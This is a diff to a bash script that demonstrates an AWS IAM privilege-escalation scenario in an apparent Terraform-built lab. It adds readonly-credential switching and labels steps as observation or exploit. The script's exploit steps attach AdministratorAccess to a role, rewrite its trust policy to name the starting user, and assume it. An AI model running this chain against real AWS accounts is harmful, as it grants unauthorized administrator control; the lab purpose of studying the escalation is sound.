@@ -65,6 +65,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(OTEL_TRACES_EXPORTER= terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -75,18 +84,29 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -101,15 +121,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -119,12 +143,15 @@ else
 fi
 echo ""
 
-# Step 4.5: Verify we don't have sts:AssumeRole permission
+# [OBSERVATION] Step 4.5: Verify starting user does NOT have sts:AssumeRole permission
 echo -e "${YELLOW}Step 4.5: Verifying starting user does NOT have sts:AssumeRole permission${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "This is crucial to the attack - the user shouldn't need sts:AssumeRole in their policy"
 echo "because being named in a trust policy grants assumption permission from the role's side"
 echo ""
 echo "Checking starting user's policy for sts:AssumeRole..."
+show_cmd "ReadOnly" "aws iam get-user-policy --user-name $STARTING_USER --policy-name pl-prod-iam-019-to-admin-starting-user-policy --query 'PolicyDocument' --output json"
 USER_POLICY=$(aws iam get-user-policy \
     --user-name $STARTING_USER \
     --policy-name pl-prod-iam-019-to-admin-starting-user-policy \
@@ -139,20 +166,24 @@ else
 fi
 echo ""
 
-# Step 5: Check target role's initial trust policy
+# [OBSERVATION] Step 5: Check target role's initial trust policy
 echo -e "${YELLOW}Step 5: Checking target role's initial trust policy${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"
 echo "Target role: $TARGET_ROLE_ARN"
 echo ""
 echo "Initial trust policy (should NOT trust starting user):"
+show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
 aws iam get-role \
     --role-name $TARGET_ROLE \
     --query 'Role.AssumeRolePolicyDocument' \
     --output json | jq '.'
 echo -e "${GREEN}✓ Confirmed: Starting user not in initial trust policy${NC}\n"
 
-# Step 6: Check target role's current policies
+# [OBSERVATION] Step 6: Check target role's current policies
 echo -e "${YELLOW}Step 6: Checking target role's current permissions${NC}"
+show_cmd "ReadOnly" "aws iam list-attached-role-policies --role-name $TARGET_ROLE --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output table"
 echo "Current attached policies on target role:"
 ATTACHED_POLICIES=$(aws iam list-attached-role-policies \
     --role-name $TARGET_ROLE \
@@ -166,8 +197,10 @@ else
 fi
 echo -e "${GREEN}✓ Target role currently has no admin access${NC}\n"
 
-# Step 7: Attach AdministratorAccess policy to target role
+# [EXPLOIT] Step 7: Attach AdministratorAccess policy to target role
 echo -e "${YELLOW}Step 7: Attaching AdministratorAccess policy to target role${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "This is the first privilege escalation action!"
 echo ""
 
@@ -183,8 +216,11 @@ echo -e "${YELLOW}Waiting 15 seconds for policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# Step 8: Verify policy was attached
+# [OBSERVATION] Step 8: Verify policy was attached
 echo -e "${YELLOW}Step 8: Verifying policy attachment${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws iam list-attached-role-policies --role-name $TARGET_ROLE --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output table"
 echo "Updated attached policies on target role:"
 aws iam list-attached-role-policies \
     --role-name $TARGET_ROLE \
@@ -193,8 +229,10 @@ aws iam list-attached-role-policies \
 
 echo -e "${GREEN}✓ AdministratorAccess policy is now attached${NC}\n"
 
-# Step 9: Update the role's trust policy to allow the starting user to assume it
+# [EXPLOIT] Step 9: Update the role's trust policy to allow the starting user to assume it
 echo -e "${YELLOW}Step 9: Updating target role trust policy${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "This is the second privilege escalation action!"
 echo "Modifying trust policy to explicitly allow: $CURRENT_USER"
 echo ""
@@ -228,9 +266,12 @@ echo -e "${YELLOW}Waiting 15 seconds for trust policy to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ Trust policy propagated${NC}\n"
 
-# Step 10: Verify the trust policy was updated
+# [OBSERVATION] Step 10: Verify the trust policy was updated
 echo -e "${YELLOW}Step 10: Verifying trust policy update${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "Current trust policy:"
+show_cmd "ReadOnly" "aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' --output json"
 aws iam get-role \
     --role-name $TARGET_ROLE \
     --query 'Role.AssumeRolePolicyDocument' \
@@ -238,8 +279,10 @@ aws iam get-role \
 
 echo -e "${GREEN}✓ Trust policy now allows starting user to assume the role${NC}\n"
 
-# Step 11: Assume the target role
+# [EXPLOIT] Step 11: Assume the target role
 echo -e "${YELLOW}Step 11: Assuming the target role with admin permissions${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Role ARN: $TARGET_ROLE_ARN"
 echo ""
 echo "Note: Starting user does NOT have sts:AssumeRole permission"
@@ -247,7 +290,7 @@ echo "However, when a principal is explicitly named in a trust policy,"
 echo "they can assume the role without needing sts:AssumeRole permission!"
 echo ""
 
-show_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $TARGET_ROLE_ARN \
     --role-session-name demo-attack-session \
@@ -266,12 +309,12 @@ ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed target role${NC}\n"
 
-# Step 12: Verify administrator access
+# [OBSERVATION] Step 12: Verify administrator access
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 echo ""
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
